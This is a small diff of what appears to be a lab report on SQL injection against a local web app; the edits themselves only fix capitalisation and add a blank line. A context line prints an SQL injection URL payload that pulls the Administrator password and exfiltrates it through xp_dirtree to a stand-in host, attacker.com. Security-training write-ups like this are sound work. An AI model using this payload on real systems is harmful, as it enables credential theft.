@@ -13,7 +13,7 @@ This report will showcase two SQLi vulnerabilities.
 
 > <cite>Description: Retrieve a list of all user credentials via SQL injection</cite>
 
-Initially, inserting an sql payload into the id parameter of the tracking url was tried. 
+Initially, inserting an SQL payload into the id parameter of the tracking url was tried. 
 
 ```html
 http://localhost:3000/#/track-result/new?id=db85-94de94ee97c543bb';%20declare%20@p%20varchar(1024);%20Example%20with%20Microsoft%20SQL%20Server%20syntax%20set%20@p%3D(SELECT%20password%20FROM%20users%20WHERE%20username%3D'Administrator');%20exec('master..xp_dirtree%22%2F%2F'%20@p%20'.attacker.com%2F%22')--
@@ -193,6 +193,7 @@ In fact, the review of the first product in the web app comes from an admin acco
 
 
 ![admin review](images/image-15.png)
+
 
 
 
